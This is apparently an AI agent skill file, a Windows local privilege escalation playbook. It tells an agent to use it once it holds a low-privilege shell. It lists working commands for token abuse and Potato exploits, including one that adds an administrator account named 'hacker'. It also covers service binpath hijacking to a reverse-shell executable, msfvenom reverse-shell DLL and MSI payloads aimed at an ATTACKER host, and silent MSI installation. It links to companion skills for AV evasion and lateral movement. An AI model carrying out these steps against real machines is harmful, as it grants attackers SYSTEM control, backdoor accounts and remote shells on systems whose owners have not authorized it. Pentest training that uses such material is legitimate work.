---
name: windows-privilege-escalation
description: >-
  Windows local privilege escalation playbook. Use when you have low-privilege shell access on Windows and need to escalate via token abuse, Potato exploits, service misconfigurations, DLL hijacking, UAC bypass, or registry autoruns.
---

# SKILL: Windows Local Privilege Escalation

## 0. RELATED ROUTING

- [windows-lateral-movement](../windows-lateral-movement/SKILL.md)
- [windows-av-evasion](../windows-av-evasion/SKILL.md)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md)

---

## 1. ENUMERATION CHECKLIST

```cmd
whoami /all                        :: user, groups, privileges
systeminfo                         :: OS version, hotfixes
net user %USERNAME%                :: group memberships
whoami /priv                       :: token privileges
```

| Privilege | Escalation Path |
|---|---|
| `SeImpersonatePrivilege` | Potato family (§2) |
| `SeAssignPrimaryTokenPrivilege` | Token manipulation |
| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM |
| `SeBackupPrivilege` | Read any file (SAM/SYSTEM/NTDS.dit) |
| `SeRestorePrivilege` | Write any file (DLL hijack, service binary) |
| `SeLoadDriverPrivilege` | Load vulnerable kernel driver |

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v
netstat -ano
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
```

---

## 2. TOKEN MANIPULATION & POTATO EXPLOITS

| Tool | OS Support | Notes |
|---|---|---|
| JuicyPotato | Win7–Server2016 | Requires valid CLSID |
| RoguePotato | Server2019+ | Needs port 135 on attacker |
| PrintSpoofer | Win10/Server2016-2019 | Simple, Print Spooler must run |
| SweetPotato | Broad | Combines multiple techniques |
| GodPotato | Win8–Server2022 | Works on latest patched |

```cmd
PrintSpoofer64.exe -i -c "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
```

---

## 3. SERVICE MISCONFIGURATIONS

```cmd
:: Unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """""

:: Weak service permissions
accesschk64.exe -wuvc * /accepteula
:: Look for: SERVICE_CHANGE_CONFIG

:: Reconfigure service binary
sc config vuln_svc binpath= "C:\temp\rev.exe"
sc stop vuln_svc && sc start vuln_svc

:: Check writable service binary
icacls "C:\Program Files\VulnApp\service.exe"
```

---

## 4. DLL HIJACKING

DLL search order: exe dir → System32 → System → Windows → CWD → PATH

```
# Find missing DLLs: Process Monitor filter:
# Result=NAME NOT FOUND, Path ends with .dll

# Place malicious DLL in writable dir before real location
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll
```

---

## 5. ALWAYSINSTALLELEVATED

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must be 1

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 6. SCHEDULED TASK ABUSE

```cmd
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Schedule Type"
icacls "C:\path\to\task\binary.exe"
:: If writable: replace binary, wait for task execution
```

---

## 7. REGISTRY AUTORUNS

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk64.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula
```

---

## 8. AUTOMATED TOOLS

| Tool | Command |
|---|---|
| winPEAS | `winPEASx64.exe` |
| PowerUp | `Invoke-AllChecks` |
| Seatbelt | `Seatbelt.exe -group=all` |
| SharpUp | `SharpUp.exe audit` |
| PrivescCheck | `Invoke-PrivescCheck` |

---

## 9. DECISION TREE

```
Low-privilege Windows shell
│
├── SeImpersonatePrivilege? → Potato family (§2)
│   ├── Win10/2019+ → GodPotato or PrintSpoofer
│   └── Older → JuicyPotato
│
├── Service misconfiguration?
│   ├── Unquoted path + writable dir → binary plant (§3)
│   ├── SERVICE_CHANGE_CONFIG → reconfigure binpath (§3)
│   └── Writable service binary → replace (§3)
│
├── DLL hijacking? → missing DLL + writable dir (§4)
│
├── AlwaysInstallElevated = 1? → MSI payload (§5)
│
├── Scheduled task abuse? → writable binary (§6)
│
├── Registry autorun writable? → replace (§7)
│
└── Run winPEAS → check stored creds, kernel exploits
```
